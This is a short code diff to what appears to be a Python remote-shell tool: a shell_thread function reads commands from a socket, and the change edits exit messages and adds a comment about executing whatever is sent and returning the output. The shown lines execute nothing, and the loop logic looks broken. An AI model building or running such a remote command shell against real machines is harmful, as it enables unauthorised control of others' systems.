@@ -26,6 +26,10 @@ def shell_thread(sock):
             buffer = data.decode()
 
             if not buffer or buffer == "exit":
-                print("Did not receive")
+                print("Exit: Trallalelo Tralala")
         if KeyboardInterrupt:
+            print(b"Keyboard Interrupt: Exiting\n\r")
             break
+
+        print(f"Executing Command {buffer}") #Execute whatever we send., Then return the Output
+        
